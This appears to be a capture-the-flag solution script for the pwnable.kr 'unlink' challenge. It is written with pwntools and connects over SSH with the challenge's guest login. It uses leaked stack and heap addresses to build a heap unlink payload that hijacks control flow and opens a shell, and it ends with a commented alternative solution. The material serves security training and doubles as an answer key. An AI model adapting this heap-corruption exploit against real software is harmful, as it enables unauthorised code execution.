from pwn import *
#context(log_level="debug")
s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
p = s.process("./unlink")

p.recvuntil("here is stack address leak: ")
stack = int(p.recv(10),16)
print(stack)
p.recvuntil("here is heap address leak: ")
heap = int(p.recv(9),16)
print(heap)

p.recvuntil("now that you have leaks, get shell!\n")

target = stack + 0x10
shell = 0x80484eb
controlled_buf = heap + 8
pad = b"A" * 12

payload = p32(shell) + pad + p32(controlled_buf+4) + p32(target)
# p.sendline(pack('<I', shell) + "A" * 12 + pack('<I', controlled_buf + 4) + pack('<I', target))
p.sendline(payload)
p.interactive()
p.close()

# intended_solution.txt

# from pwn import *
# context.arch = 'i386'    # i386 / arm
# r = process(['/home/unlink/unlink'])
# leak = r.recvuntil('shell!\n')
# stack = int(leak.split('leak: 0x')[1][:8], 16)
# heap = int(leak.split('leak: 0x')[2][:8], 16)
# shell = 0x80484eb
# payload = pack(shell)        # heap + 8  (new ret addr)
# payload += pack(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
# payload += '3333'        # heap + 16
# payload += '4444'
# payload += pack(stack - 0x20)    # eax. (address of old ebp of unlink) -4
# payload += pack(heap + 16)    # edx.
# r.sendline( payload )
# r.interactive()
